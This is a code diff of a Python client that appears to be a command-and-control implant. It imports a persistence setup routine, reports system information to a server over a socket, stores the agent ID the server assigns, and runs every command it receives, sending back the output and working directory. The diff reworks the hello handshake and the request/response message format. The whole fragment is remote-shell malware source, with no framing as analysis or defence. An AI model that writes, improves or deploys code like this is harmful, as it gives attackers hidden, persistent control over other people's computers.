@@ -1,7 +1,7 @@
 import os
 import socket
 import time
-from data import get_system_info
+from system_info import get_system_info
 from shell import run_command
 from helper import send_json, receive_json
 from persistence import setup_persistence
@@ -26,23 +26,29 @@ def read_uuid() -> str | None:
 
     return None
 
-def communicate(s: socket.socket, initial_connection_info: dict) -> None:
+def communicate(s: socket.socket, system_info: dict) -> None:
 
     while True:
+        # Construct agent hello message
+        agent_hello = system_info
+        agent_hello["type"] = "agent-hello"
+
         # Read agent_id
         agent_id = read_uuid()
         if agent_id:
-            initial_connection_info["agent_id"] = agent_id
+            agent_hello["agent_id"] = agent_id
 
-        # Send system info
-        send_json(s, initial_connection_info)
+        # Send agent hello message
+        send_json(s, agent_hello)
 
-        # Receive
-        agent_uid = receive_json(s)
+        # Receive server hello message
+        server_hello = receive_json(s)
+        if server_hello.get("type") != "server-hello":
+            continue
 
         # Save to file received agent_id
         with open(AGENT_ID_LOCATION, "w") as f:
-            f.write(agent_uid)
+            f.write(server_hello["agent_id"])
 
         while True:
             try:
@@ -52,14 +58,15 @@ def communicate(s: socket.socket, initial_connection_info: dict) -> None:
                     s.close()
                     main()
 
-                response_tuple = run_command(message["command"])
-                response = {
-                    "type": "command_response",
-                    "command_id": message["command_id"],
-                    "command_response": response_tuple[0],
-                    "cwd":  response_tuple[1],
-                }
-                send_json(s, response)
+                if message.get("type") == "request":
+                    response_tuple = run_command(message.get("command"))
+                    response = {
+                        "type": "response",
+                        "response_id": message.get("request_id"),
+                        "response": response_tuple[0],
+                        "cwd":  response_tuple[1],
+                    }
+                    send_json(s, response)
 
             except socket.timeout:  # If socket timeout, send heartbeat
                 message = {
